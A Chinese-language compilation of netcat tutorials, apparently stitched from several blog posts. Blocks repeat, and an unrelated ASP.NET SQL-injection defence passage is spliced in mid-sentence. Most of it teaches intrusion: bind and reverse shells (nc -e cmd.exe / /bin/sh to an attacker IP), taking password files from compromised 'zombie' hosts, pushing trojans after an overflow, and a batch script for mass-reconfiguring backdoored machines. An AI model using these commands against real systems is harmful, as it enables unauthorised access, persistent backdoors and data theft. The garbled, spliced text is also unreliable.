**1)连接到REMOTE主机，例子：格式：nc -nvv 192.168.x.x 80讲解：连到192.168.x.x的TCP80端口**
**2)监听LOCAL主机，例子：格式：nc -l -p 80讲解：监听本机的TCP80端口**
**3)扫描远程主机，例子：格式：nc -nvv -w2 -z 192.168.x.x 80-445讲解：扫描192.168.x.x的TCP80到TCP445的所有端口**
**4)REMOTE主机绑定SHELL，例子：格式：nc -l -p 5354 -t -e c:winntsystem32cmd.exe讲解：绑定REMOTE主机的CMDSHELL在REMOTE主机的TCP5354端口**
**5)REMOTE主机绑定SHELL并反向连接，例子：格式：nc -t -e c:winntsystem32cmd.exe 192.168.x.x 5354讲解：绑定REMOTE主机的CMDSHELL并反向连接到192.168.x.x的TCP5354端口**
**以上为最基本的几种用法（其实NC的用法还有很多，当配合管道命令“|”与重定向命令“<”、“>”等等命令功能更强大......）。**
**高级用法：**
**6)作攻击程序用，例子：格式1：type.exe c:exploit.txt|nc -nvv 192.168.x.x 80格式2：nc -nvv 192.168.x.x 80 < c:exploit.txt讲解：连接到192.168.x.x的80端口，并在其管道中发送c:exploit.txt的内容(两种格式确有相同的效果，真是有异曲同工之妙:P)**
**附：c:exploit.txt为shellcode等**
**7)作蜜罐用[1]，例子：格式：nc -L -p 80讲解：使用-L(注意L是大写)可以不停地监听某一个端口，直到ctrl+c为止.**
**8)作蜜罐用[2]，例子：格式：nc -L -p 80 > c:log.txt讲解：使用-L可以不停地监听某一个端口，直到ctrl+c为止，同时把结果输出到c:log.txt中，如果把‘>’改为‘>>’即可以追加日志。**
**附：c:log.txt为日志等**
**9)作蜜罐用[3]，例子：格式1：nc -L -p 80 < c:honeypot.txt格式2：type.exe c:honeypot.txt|nc -L -p 80讲解：使用-L可以不停地监听某一个端口，直到ctrl+c为止，并把c:honeypot.txt的内容‘送’入其管道中。**
NC工具的使用说明
参数介绍： 
nc.exe -h即可看到各参数的使用方法。 
基本格式：nc [-options] hostname port [ports] ... 
nc -l -p port [options] [hostname] [port]
-d 后台模式 
-e prog 程序重定向，一旦连接，就执行 [危险!!] 
-g gateway source-routing hop point, up to 8 
-G num source-routing pointer: 4, 8, 12, ... 
-h 帮助信息 
-i secs 延时的间隔 
-l 监听模式，用于入站连接 
-L 连接关闭后,仍然继续监听 
-n 指定数字的IP地址，不能用hostname 
-o file 记录16进制的传输 
-p port 本地端口号 
-r 随机本地及远程端口 
-s addr 本地源地址 
-t 使用TELNET交互方式 
-u UDP模式 
-v 详细输出--用两个-v可得到更详细的内容 
-w secs timeout的时间 
-z 将输入输出关掉--用于扫描时
端口的表示方法可写为M-N的范围格式。
===========================================================================================
基本用法：
大概有以下几种用法：
1)连接到REMOTE主机，例子： 
格式：nc -nvv 192.168.x.x 80 
讲解：连到192.168.x.x的TCP80端口
2)监听LOCAL主机，例子： 
格式：nc -l -p 80 
讲解：监听本机的TCP80端口
3)扫描远程主机，例子： 
格式：nc -nvv -w2 -z 192.168.x.x 80-445 
讲解：扫描192.168.x.x的TCP80到TCP445的所有端口
4)REMOTE主机绑定SHELL，例子： 
格式：nc -l -p 5354 -t -e c:winntsystem32cmd.exe 
讲解：绑定REMOTE主机的CMDSHELL在REMOTE主机的TCP5354端口
5)REMOTE主机绑定SHELL并反向连接，例子： 
格式：nc -t -e c:winntsystem32cmd.exe 192.168.x.x 5354 
讲解：绑定REMOTE主机的CMDSHELL并反向连接到192.168.x.x的TCP5354端口
以上为最基本的几种用法（其实NC的用法还有很多， 
当配合管道命令“|”与重定向命令“<”、“>”等等命令功能更强大......）。
=========================================================================================== 
高级用法：
6)作攻击程序用，例子： 
格式1：type.exe c:exploit.txt|nc -nvv 192.168.x.x 80 
格式2：nc -nvv 192.168.x.x 80 < c:exploit.txt 
讲解：连接到192.168.x.x的80端口，并在其管道中发送c:exploit.txt的内容(两种格式确有相同的效果， 
真是有异曲同工之妙:P)
附：c:exploit.txt为shellcode等
7)作蜜罐用[1]，例子： 
格式：nc -L -p 80 
讲解：使用-L(注意L是大写)可以不停地监听某一个端口，直到ctrl+c为止
8)作蜜罐用[2]，例子： 
格式：nc -L -p 80 > c:log.txt 
讲解：使用-L可以不停地监听某一个端口，直到ctrl+c为止，同时把结果输出到c:log.txt中，如果把‘>’ 
改为‘>>’即可以追加日志
附：c:log.txt为日志等
9)作蜜罐用[3]，例子：
格式1：nc -L -p 80 < c:honeypot.txt
格式2：type.exe c:honeypot.txt|nc -L -p 80
讲解：使用-L可以不停地监听某一个端口，直到ctrl+c为止，并把c:honeypot.txt的内容‘送’入其管道中如果攻击者知道应用会将表单中输入的内容直接用于验证身份的查询，他就会尝试输入某些特殊的SQL字符串篡改查询改变其原来的功能，欺骗系统授予访问权限。
系统环境不同，攻击者可能造成的损害也不同，这主要由应用访问[数据库](http://lib.csdn.net/base/mysql)
的安全权限决定。如果用户的帐户具有管理员或其他比较高级的权限，攻击者就可能对数据库的表执行各种他想要做的操作，包括添加、删除或更新数据，甚至可能直接删除表。
二、如何防范？
好在要防止ASP[.NET](http://lib.csdn.net/base/dotnet)应用被SQL注入式攻击闯入并不是一件特别困难的事情，只要在利用表单输入的内容构造SQL命令之前，把所有输入内容过滤一番就可以了。过滤输入内容可以按多种方式进行。
⑴ 对于动态构造SQL查询的场合，可以使用下面的技术：
第一：替换单引号，即把所有单独出现的单引号改成两个单引号，防止攻击者修改SQL命令的含义。再来看前面的例子，“Select * from Users Where login = or 1=1 AND password = or 1=1”显然会得到与“Select * from Users Where login = or 1=1 AND password = or 1=1”不同的结果。
第二：删除用户输入内容中的所有连字符，防止攻击者构造出类如“Select * from Users Where login = mas -- AND password =”之类的查询，因为这类查询的后半部分已经被注释掉，不再有效，攻击者只要知道一个合法的用户登录名称，根本不需要知道用户的密码就可以顺利获得访问权限。
第三：对于用来执行查询的数据库帐户，限制其权限。用不同的用户帐户执行查询、插入、更新、删除操作。由于隔离了不同帐户可执行的操作，因而也就防止了原本用于执行Select命令的地方却被用于执行Insert、Update或Delete命令。
⑵ 用存储过程来执行所有的查询。SQL参数的传递方式将防止攻击者利用单引号和连字符实施攻击。此外，它还使得数据库权限可以限制到只允许特定的存储过程执行，所有的用户输入必须遵从被调用的存储过程的安全上下文，这样就很难再发生注入式攻击了。
⑶ 限制表单或查询字符串输入的长度。如果用户的登录名字最多只有10个字符，那么不要认可表单中输入的10个以上的字符，这将大大增加攻击者在SQL命令中插入有害代码的难度。
⑷ 检查用户输入的合法性，确信输入的内容只包含合法的数据。数据检查应当在客户端和服务器端都执行——之所以要执行服务器端验证，是为了弥补客户端验证机制脆弱的安全性。
在客户端，攻击者完全有可能获得网页的源代码，修改验证合法性的脚本（或者直接删除脚本），然后将非法内容通过修改后的表单提交给服务器。因此，要保证验证操作确实已经执行，唯一的办法就是在服务器端也执行验证。你可以使用许多内建的验证对象，例如RegularExpressionValidator，它们能够自动生成验证用的客户端脚本，当然你也可以插入服务器端的方法调用。如果找不到现成的验证对象，你可以通过CustomValidator自己创建一个。
⑸ 将用户登录名称、密码等数据加密保存。加密用户输入的数据，然后再将它与数据库中保存的数据比较，这相当于对用户输入的数据进行了“消毒”处理，用户输入的数据不再对数据库有任何特殊的意义，从而也就防止了攻击者注入SQL命令。System.Web.Security.formsAuthentication类有一个HashPasswordForStoringInConfigFile，非常适合于对输入数据进行消毒处理。
⑹ 检查提取数据的查询所返回的记录数量。如果程序只要求返回一个记录，但实际返回的记录却超过一行，那就当作出错处理。
参数解释： 
-e 程序重定向 
-t 用telnet来回应 
-l  监听本地端口 
-p  指定本地端口 
-v  获得端口信息 
-vv  获得详细的端口信息 
-z  关闭输入输出 
-n  指定IP地址 
-w 设定超时时间 
-u  UDP端口
我就知道这么些参数 了
第一个: 
nc -l -v -p 7626 
这就是打开本地的7626端口进行监听，并反馈连接信息这样如果有扫描冰河木马的人会认为你中了木马开放了7626，和“小猪快跑”的功能有点象，再加个批处理文件一起用的话就是一个“小猪快跑”了
如果要监视是否有入侵本地80端口的行为，并记下来，用这个命令： 
nc -l -p 80 >>c:\\日志.dat 
这样，凡是有针对本机80端口的攻击都会被记录下来的
二、 
如果你通过溢出进入了别人的机器，就可以运行： 
nc -l -p 123 -e cmd.exe 
或者是: nc -l -p 123 -t 
作用都是以cmd.exe来响应到机器上123端口的连接 
这样就把溢出的主机变成了一台telnet肉鸡了啊 
你也可一用命令让肉鸡主动连接你的主机,假设我的IP是192.168.0.1 
在肉鸡上运行： nc -e cmd.exe 192.168.0.1 777 
再在本地机器上运行： nc -l -p 777 
意思是让肉鸡将cmd.exe(就是个shell)主动响应到你电脑的777端口 
你再在本地机上监听777端口，这样就进入了对方的cmd了 
这也微十时毫 反弹端口式木马的原理了。
三、 
用这个命令： 
nc -v 192.168.0.25 80 
就获得了192.168.0.25的80端口的信息 
可以获得IIS版本等很多重要信息 的
四、 
你也可以将NC作为扫描器使用： 
nc -v -z 192.168.0.25 1-100 
扫描192.168.0.25的1到100间的TCP端口
用nc -v -z -u 192.168.0.25 1-100 
这是扫描1到00间的UDP端口
3.1.端口的刺探：
nc -vv ip port 
RIVER [192.168.0.198] 19190 (?) open //显示是否开放open
3.2.扫描器
nc -vv -w 5 ip port-port port 
nc -vv -z ip port-port port
　　这样扫描会留下大量的痕迹，系统管理员会额外小心。
3.3. 后门
victim machine: //受害者的机器 
nc -l -p port -e cmd.exe //win2000 
nc -l -p port -e /bin/sh //unix,linux 
attacker machine: //攻击者的机器. 
nc ip -p port //连接victim_IP,然后得到一个shell。
3.4.反向连接 
attacker machine: //一般是sql2.exe,远程溢出,webdavx3.exe攻击. 
//或者wollf的反向连接. 
nc -vv -l -p port 
victim machine: 
nc -e cmd.exe attacker ip -p port 
nc -e /bin/sh attacker ip -p port
或者：
attacker machine: 
nc -vv -l -p port1  
nc -vv -l -p prot2  
victim machine: 
nc attacker_ip port1 | cmd.exe | nc attacker_ip port2 
nc attacker_ip port1 | /bin/sh | nc attacker_ip port2
　　139要加参数-s（nc.exe -L -p 139 -d -e cmd.exe -s 对方机器IP），这样就可以保证nc.exe优先于NETBIOS。
3.5.传送文件：
3.5.1 attacker machine <-- victim machine //从肉鸡拖密码文件回来. 
nc -d -l -p port < path\filedest 　　　 可以shell执行 
nc -vv attacker_ip port > path\file.txt 需要Ctrl+C退出 
//肉鸡需要gui界面的cmd.exe里面执行(终端登陆,不如安装FTP方便).否则没有办法输入Crl+C.
3.5.2 attacker machine --> victim machine //上传命令文件到肉鸡 
nc －vv -l -p port > path\file.txt　　　　　 需要Ctrl+C退出 
nc -d victim_ip port < path\filedest 　 可以shell执行 
//这样比较好.我们登陆终端.入侵其他的肉鸡.可以选择shell模式登陆.
　3.6 端口数据抓包.
nc -vv -w 2 -o test.txt xfocus[.Net](http://lib.csdn.net/base/dotnet) 80 21-15
< 00000058 35 30 30 20 53 79 6e 74 61 78 20 65 72 72 6f 72 # 500 Syntax error 
< 00000068 2c 20 63 6f 6d 6d 61 6e 64 20 22 22 20 75 6e 72 # , command "" unr 
< 00000078 65 63 6f 67 6e 69 7a 65 64 2e 0d 0a # ecognized... 
< 00000084 83 00 00 01 8f # .....
3.7 telnet,自动批处理。
nc victim_ip port < path\file.cmd 　 显示执行过程. 
nc -vv victim_ip port < path\file.cmd 　 显示执行过程.
nc -d victim_ip port < path\file.cmd 安静模式.
_______________file.cmd________________________ 
password 
cd %windir% 
echo []=[%windir%] 
c: 
cd \ 
md test 
cd /d %windir%\system32\ 
net stop sksockserver 
snake.exe -config port 11111 
net start sksockserver 
exit 
_______________file.cmd__END___________________
######################################## 
4. 管理肉鸡,更改肉鸡设置 
########################################
4.1 比如要统一更改肉鸡上面的代理端口.snake.exe 修改为11111 服务名称"sksockserver"，使用winshell后门. 端口1234 密码password
命令格式就是：
modi.bat youip.txt
___________modi.bat____
________________________ 
@if "%1"=="" echo Error: no ip.txt &&goto END
:start 
@echo password >a.cmd 
@echo s >>a.cmd 
@echo cd /d %%windir%%\system32\ >>a.cmd 
@net stop "sksockserver" >>a.cmd 
@snake.exe -config port 11111 >>a.cmd 
@net start "sksockserver" >>a.cmd 
@exit >>a.cmd
:auto 
@for /f "eol=; tokens=1,2" %%i in (%1) do @(nc.exe -vv -w 3 %%i 1234 < a.cmd)
:END 
___________modi.bat__END_______________________
4.2 
@echo off 
color f0 
:start 
cls 
C:\nc -vv -w 3 -l -p 80>>80.txt 
goto start
　　把防火墙关掉以后运行这个批处理，会监听到许多探测U漏洞的信息，大多是三条一组--妮姆达病毒扫描你的。这样就会得到肉鸡的.虽然质量不高.但是也是一种便宜的办法.
　　肉鸡特征：
　　1。unicode漏洞 
　　2。guest密码为空，administrators组用户 
　　3。其他漏洞
一、基本使用：
Quack# nc -h 
[v1.10] 
　　想要连接到某处: nc [-options] hostname port [ports] ... 
　　绑定端口等待连接:　　 nc -l -p port [-options] [hostname] [port] 
　　参数: 
　　　　-e prog　　　　　　　　 程序重定向，一旦连接，就执行 [危险!!] 
　　　　-g gateway　　　　　　 source-routing hop point, up to 8 
　　　　-G num　　　　　　　　 source-routing pointer: 4, 8, 12, ... 
　　　　-h　　　　　　　　　　 帮助信息 
　　　　-i secs　　　　　　　　 延时的间隔 
　　　　-l　　　　　　　　　　 监听模式，用于入站连接 
　　　　-n　　　　　　　　　　 指定数字的IP地址，不能用hostname 
　　　　-o file　　　　　　　　 记录16进制的传输 
　　　　-p port　　　　　　　　 本地端口号 
　　　　-r　　　　　　　　　　 任意指定本地及远程端口 
　　　　-s addr　　　　　　　　 本地源地址 
　　　　-u　　　　　　　　　　 UDP模式 
　　　　-v　　　
　　　　　　　 详细输出——用两个-v可得到更详细的内容 
　　　　-w secs　　　　　　　　 timeout的时间 
　　　　-z　　　　　　　　　　 将输入输出关掉——用于扫描时
　　其中端口号可以指定一个或者用lo-hi式的指定范围。
二、用于传输文件——ncp
#! /bin/sh 
## 类似于rcp，但是是用netcat在高端口做的 
## 在接收文件的机器上做"ncp targetfile" 
## 在发送文件的机器上做"ncp sourcefile receivinghost" 
## 如果调用了 "nzp" ，会将传输文件压缩
## 这里定义你想使用的端口，可以自由选择 
MYPORT=23456
## 如果nc没有在系统路径中的话，要把下面一行注释去掉，加以修改 
# PATH=$:$ ; export PATH
## 下面这几行检查参数输入情况：
test "$3" && echo "too many args" && exit 1 
test ! "$1" && echo "no args?" && exit 1 
me=`echo $0 | sed s+.*/++` 
test "$me" = "nzp" && echo [compressed mode]
# if second arg, its a host to send an [extant] file to. 
if test "$2" ; then 
test ! -f "$1" && echo "cant find $1" && exit 1 
if test "$me" = "nzp" ; then 
　　compress -c < "$1" | nc -v -w 2 $2 $MYPORT && exit 0 
else 
　　nc -v -w 2 $2 $MYPORT < "$1" && exit 0 
fi 
echo "transfer FAILED!" 
exit 1 
fi
# 是否在接收文件机器当前目录有同名文件
if test -f "$1" ; then 
echo -n "Overwrite $1? " 
read aa 
test ! "$aa" = "y" && echo "[punted!]" && exit 1 
fi 
# 30 seconds oughta be pleeeeenty of time, but change if you want. 
if test "$me" = "nzp" ; then 
# 注意这里nc的用法，结合了重定向符号和管道 
nc -v -w 30 -p $MYPORT -l < /dev/null | uncompress -c > "$1" && exit 0 
else 
nc -v -w 30 -p $MYPORT -l < /dev/null > "$1" && exit 0 
fi 
echo "transfer FAILED!" 
# clean up, since even if the transfer failed, $1 is already trashed 
rm -f "$1" 
exit 1
这样的话，我只要在A机器上先 QuackA# ncp ../abcd 
listening on 然后在另一台机器B上 
QuackB#ncp abcd 192.168.0.2 
quackb [192.168.0.1] 23456 (?) 
A机上出现 
open connect to [192.168.0.2] from quackb [192.168.0.1] 1027 
#
　　查看一下，文件传输完毕。
![](http://pic002.cnblogs.com/images/2012/323200/2012121319563327.gif)
===========================================================================
【本地运行】nc -v ip port
【命令解释】扫瞄某 IP 的某个端口，返回信息详细输出。
===========================================================================
【本地运行】nc -v -z ip port-port
【命令解释】扫描某IP的端口到某端口，返回信息详细输出，但扫描速度较慢。
===========================================================================
【本地运行】nc -v -z -u ip  port-port
【命令解释】扫描某 IP 的某 UDP 端口到某 UDP 端口，返回信息详细输出，但扫描速度较慢。
===========================================================================
【本地运行】nc -l -p 80 
【命令解释】开启本机的 TCP 80 端口并监听。
===========================================================================
【本地运行】nc -l -v -p 80
【命令解释】开启本机的 TCP 80 端口并将监听到的信息输出到当前 CMD 窗口。
===========================================================================
【本地运行】nc -l -p 80 > E:/log.dat
【命令解释】开启本机的 TCP 80 端口并将监听到的信息输出到 E:/log.dat 下的日志文件里。
===========================================================================
【本地运行】nc -nvv 192.168.1.101 80 
【命令解释】连接到192.168.1.101主机的 80 端口。
===========================================================================
【本地运行】nc -nvv -w2 -z 192.168.1.101 80-1024 
【命令解释】扫锚192.168.1.101的80-1024端口，连接超时时间为2秒。
===========================================================================
【远程运行】nc -l -p 2012 -t -e cmd.exe
【本地运行】nc -nvv 192.168.1.101 2012
【命令解释】采用正向连接方式，远程主机（注：假设IP地址为 192.168.1.101）上运行 nc -l -p 2012 -t -e cmd.exe 意为绑定远程主机的 CMD 到
【命令解释】2012 端口，当本地主机连接远程主机成功时就会返回给本地主机一个CMD Shell ；在本地主机上运行 nc -nvv 192.168.1.101 2012 用于
【命令解释】连接已经将 CMD 重定向到 2012 端口的远程主机（注：假设IP地址为 192.168.1.101）。
===========================================================================
【本地运行】nc -l -p 2012
【远程运行】nc -t -e cmd.exe 192.168.1.102 2012
【命令解释】采用反向连接方式，先在本地主机运行 nc -l -p 2012 开启本地主机的（注：假设IP地址为 192.168.1.102）2012 端口并监听等待远程主
【命令解释】机连接；在远程主机上运行 nc -t -e cmd.exe 192.168.1.102 2012 将远程主机的 CMD 重定向到 IP 地址为 192.168.1.102 端口号为
【命令解释】2012 的主机上，连接成功后 IP 地址为 192.168.1.102 的主机会得到一个CMD Shell。
===========================================================================
【本地运行】nc -v -n ip port < C:/sunzn.exe
【远程运行】nc -v -l -p port > D:/sunzn.exe
【命令解释】在本地运行 nc -v -n ip port < C:/sunzn.exe 意为从本地 C 盘根目录中读取 sunzn.exe 文件的内容，并把这些数据发送到远程主机的
【命令解释】对应端口上（注：命令行中的 IP 为接收文件的远程主机 IP ），在远程主机运行 nc -v -l -p port > D:/sunzn.exe 意为监听对应端口并
【命令解释】把接收到的信息数据写到 D:/sunzn.exe 中，两行命令实现了文件在本地主机和远程主机间的传输。
===========================================================================
【本地运行】nc -L -p 8989<C:\ftp.txt （ ftp.txt 中为FTP自动下载命令）
【命令解释】不停地监听 8989 端口，并把 C:\ftp.txt  中的内容发给任何一台连接本机 8989 端口的主机，可起到传送文件作用（此用法经常用于反向
【命令解释】溢出）。溢出远程主机时，一旦溢出的远程主机连接本地主机 8989 端口，远程主机就会自动用 FTP 下载指定的文件，如木马。
===========================================================================
写一篇简单一点的使用教程：
命令1：监听命令
nc -l -p port
nc -l -p port > e:\log.dat
nc -l -v -p port
参数解释：
-l：监听端口，监听入站信息
-p：后跟本地端口号
-v：显示端口的信息，如果使用-vv的话，则会显示端口更详细的信息
提示：一般大家都爱用-vv
nc -l -p 80
这个很简单，监听80端口
如果机器上运行这个命令，端口80被认为是开放的，可以欺骗扫描器
nc -l -p 80 > e:\log.dat
将详细信息写入E盘log.dat的日志文件
nc -l -v -p 80
和上边命令相似，会直接显示信息在运行着NC的屏幕上。
实践：
例如：nc -l -v -p 80
然后在浏览器中输入本机IP：127.0.0.1
命令2：程序定向（反弹shell的方法）
nc -l -p port -t -e cmd.exe
本地机： nc -l -p port 或 nc -l -v -p port
目标机：nc -e cmd.exe ip port
参数解释：
-l、-p两个参数已经解释过了
-e；作用就是程序定向
-t：以telnet的形式来应答
例子
nc -l -p 5277 -t -e cmd.exe
千万不要运行在自己的机器上，如果运行了，你机器就会变成一台TELNET的服务器了。
命令解释为：监听本地端口5277的入站信息，同时将CMD.exe这个程序，重定向到端口5277上，当有人连接的时候，就让程序CMD.exe以TELNET的形式来响应连接要求。
说白了，其实就是让他成为一台TELNET的肉鸡，所以这个命令要运行在你的肉鸡上。
例如用法：
local machine：nc -l -p port ( or nc -l -v -p port )
remote machine：nc -e cmd.exe ip port
大家知道灰鸽子和神偷吧，这两款工具都是利用了反弹端口型的木马，
什么叫反弹端口？
就是说，当对方中马后，不用你主动和对方连接，也就是说不用从你的client端向对方主机上运行的server端发送请求连接，而是对方主动来连接你这样就可以使很多防火墙失效，因为很多防火墙都不检查出站请求的。这里这两个命令结合在一起后，于那两款木马可以说有异曲同工之效。
本地运行：nc -l -p 5277 （监听本地5277端口）或者 nc -l -v -p 5277
然后在远程机器上，想办法运行 nc -e cmd.exe ip 5277
（你可别真的打“ip”在肉鸡上啊）要打，xxx.xxx.xxx.xxx这样！！
这样就是反弹~~在本地机器上得到了一个SHELL
命令3：扫描端口
nc -v ip port
nc -v -z ip port-port
nc -v -z -u ip port-port
参数解释：
-z：将输入输出关掉，在扫描时使用
nc -v ip port
这个命令是针对某一个端口进行扫描
例如：
nc -v ip 135
扫描远程主机的135端口，这样获得了该端口的一些简单信息，但是针对某些端口，我们还可以获得更多的信息
例如：80端口
我们可以使用nc -v ip 80 然后使用get方法来获得对方的WEB服务器的信息
nc -v -z ip port-port
这个命令是用来扫描的一个命令，这个命令用于快速扫描TCP端口，而port-port则是指定了扫描的端口范围
例如：
nc -v -z ip 1-200
可以看到我机器上的1-200的TCP端口的开放情况
nc -v -z -u ip port-port
这个命令比上个命令多了个-u，这个命令的作用仍然是扫描端口，只是多了一个-u的参数，是用来扫UDP端口的
例如：
nc -v -z -u ip 1-200
这个命令就会扫1-200的UDP端口
命令4：传送文件（HOHO，I LIKE）
LOCAL MACHINE：nc -v -n ip port < x:\svr.exe
REMOTE MACHINE：nc -v -l -p port > y:\svr.exe
参数解释：
-n：指定数字的IP地址
这两个命令结合起来是用来传送文件的
首先，在远程机上运行命令：
nc -v -l -p 5277 > c:\pulist.exe
这个命令还记的吗？呵呵，是不是和监听命令有点类似，对，没错，这个是监听5277端口
并把接受到的信息数据写到c:\pulist.exe中
这时候在本地机上运行
nc -v -n ip 5277 < e:\hack\pulist.exe
这个命令的意思就是，从本地E盘跟目录中读取pulist.exe文件的内容，并把这些数据发送到ip的5277端口上
这样远程主机就会自动创建一个pulist.exe文件。
**nc的使用方法**
**netcat被誉为网络安全界的‘瑞士军刀’，相信没有什么人不认识它吧......一个简单而有用的工具，透过使用TCP或UDP协议的网络连接去读写数据。它被设计成一个稳定的后门工具，能够直接由其它程序和脚本轻松驱动。同时，它也是一个功能强大的网络调试和探测工具，能够建立你需要的几乎所有类型的网络连接，还有几个很有意思的内置功能(详情请看下面的使用方法)。 **
**在中国，它的WINDOWS版有两个版本，一个是原创者Chris Wysopal写的原版本，另一个是由‘红与黑’编译后的新‘浓缩’版。‘浓缩’版的主程序只有10多KB（10多KB的NC是不能完成下面所说的第4、第5种使用方法，有此功能的原版NC好象要60KB：P），虽然“体积”小，但很完成很多工作。**
**软件介绍：**
**工具名：Netcat作者：Hobbit && Chris Wysopal网址：**[**http://www.atstake.com/research/tools/network_utilities/**](http://www.atstake.com/research/tools/network_utilities/)
**类别：开放源码平台：Linux/BSD/Unix/Windows **WINDOWS**下版本号：[v1.10 NT]**
**参数介绍：**
**nc.exe -h即可看到各参数的使用方法。基本格式：nc [-options] hostname port[s] [ports] ...**nc -l -p port [options] [hostname] [port]****
**-d 后台模式**-e prog **程序重定向，一旦连接，就执行 [危险!!]**-g gateway source-routing hop point[s], up to 8-G num source-routing pointer: 4, 8, 12, ...-h **帮助信息**-i secs **延时的间隔**-l **监听模式，用于入站连接**-L **连接关闭后,仍然继续监听**-n **指定数字的IP地址，不能用hostname**-o file **记录16进制的传输**-p port **本地端口号**-r **随机本地及远程端口**-s addr **本地源地址**-t **使用TELNET交互方式**-u UDP**模式**-v **详细输出--用两个-v可得到更详细的内容**-w secs timeout**的时间**-z **将输入输出关掉--用于扫描时**
**端口的表示方法可写为M-N的范围格式。**
**基本用法：**
**大概有以下几种用法：**
**1)连接到REMOTE主机，例子：格式：nc -nvv 192.168.x.x 80讲解：连到192.168.x.x的TCP80端口**
**2)监听LOCAL主机，例子：格式：nc -l -p 80讲解：监听本机的TCP80端口**
**3)扫描远程主机，例子：格式：nc -nvv -w2 -z 192.168.x.x 80-445讲解：扫描192.168.x.x的TCP80到TCP445的所有端口**
**4)REMOTE主机绑定SHELL，例子：格式：nc -l -p 5354 -t -e c:winntsystem32cmd.exe讲解：绑定REMOTE主机的CMDSHELL在REMOTE主机的TCP5354端口**
**5)REMOTE主机绑定SHELL并反向连接，例子：格式：nc -t -e c:winntsystem32cmd.exe 192.168.x.x 5354讲解：绑定REMOTE主机的CMDSHELL并反向连接到192.168.x.x的TCP5354端口**
**以上为最基本的几种用法（其实NC的用法还有很多，当配合管道命令“|”与重定向命令“<”、“>”等等命令功能更强大......）。**
**高级用法：**
**6)作攻击程序用，例子：格式1：type.exe c:exploit.txt|nc -nvv 192.168.x.x 80格式2：nc -nvv 192.168.x.x 80 < c:exploit.txt讲解：连接到192.168.x.x的80端口，并在其管道中发送c:exploit.txt的内容(两种格式确有相同的效果，真是有异曲同工之妙:P)**
**附：c:exploit.txt为shellcode等**
**7)作蜜罐用[1]，例子：格式：nc -L -p 80讲解：使用-L(注意L是大写)可以不停地监听某一个端口，直到ctrl+c为止.**
**8)作蜜罐用[2]，例子：格式：nc -L -p 80 > c:log.txt讲解：使用-L可以不停地监听某一个端口，直到ctrl+c为止，同时把结果输出到c:log.txt中，如果把‘>’改为‘>>’即可以追加日志。**
**附：c:log.txt为日志等**
**9)作蜜罐用[3]，例子：格式1：nc -L -p 80 < c:honeypot.txt格式2：type.exe c:honeypot.txt|nc -L -p 80讲解：使用-L可以不停地监听某一个端口，直到ctrl+c为止，并把c:honeypot.txt的内容‘送’入其管道中。**
